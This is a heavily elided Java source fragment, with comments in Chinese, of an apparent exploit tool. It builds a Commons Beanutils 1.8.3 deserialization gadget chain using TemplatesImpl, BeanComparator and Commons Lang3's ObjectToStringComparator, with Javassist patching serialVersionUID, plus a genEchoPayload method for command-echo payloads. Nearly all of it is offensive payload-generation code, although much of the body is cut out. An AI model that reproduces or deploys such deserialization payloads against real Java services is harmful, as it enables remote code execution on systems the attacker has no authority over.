...
/**
 * CommonsBeanutilsObjectToStringComparator_183 利用链
 * 结合 CBObjectToString 和 CB1_183：
 * 1. 使用 Javassist 动态修改 serialVersionUID
 * 2. 使用 Apache Commons Lang3 的 ObjectToStringComparator
...
public class CommonsBeanutilsObjectToStringComparator_183 {
    ...
    /**
     * 构造 CBObjectToString_183 链 payload
    ...
    private byte[] getPayload(TemplatesImpl templatesImpl) throws Exception {
        ...
        // 设置 comparator 为 ObjectToStringComparator
        setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());
    ...
    public static String genEchoPayload(String echoType, String key, String cryptType) throws Exception {
        ...
        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsObjectToStringComparator_183().getPayload(templatesImpl);
